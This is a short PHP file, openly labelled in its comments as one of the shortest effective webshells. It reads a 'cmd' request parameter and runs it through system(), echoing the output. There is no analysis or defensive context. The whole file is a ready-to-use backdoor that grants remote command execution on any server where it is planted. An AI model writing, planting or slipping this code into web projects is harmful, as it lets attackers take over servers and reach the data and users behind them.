<?php
	//One of the shortest webshells that could be efective
	//just pass as param the command that we wanna execute 
	
	if(isset($_REQUEST['cmd'])){
	echo "<pre>";
	$cmd = ($_REQUEST['cmd']);
	system($cmd);
	echo "</pre>";
	die;
	}
	
?>